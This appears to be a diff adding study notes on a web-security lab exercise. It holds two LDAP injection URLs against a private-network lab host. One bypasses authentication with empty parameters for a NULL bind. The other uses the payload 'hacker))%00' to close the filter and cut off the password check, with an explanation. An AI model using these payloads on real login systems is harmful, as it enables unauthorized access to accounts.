@@ -1,0 +1,2 @@
+http://192.168.184.128/ldap/example1.php?   [remove the parameter completely, and php code will get NULL, LDAP server will accept NULL/NULL]
+http://192.168.184.128/ldap/example2.php?name=hacker))%00&password=lzc   [LDAP syntax:(&(cn=user)(userPassword=HASH(passwd))),   assign 'hacker))' to close the former two brackets, and add '%00'(NULL byte) to get rid of the end of passwd filter; so we can login hacker with any passwd.]
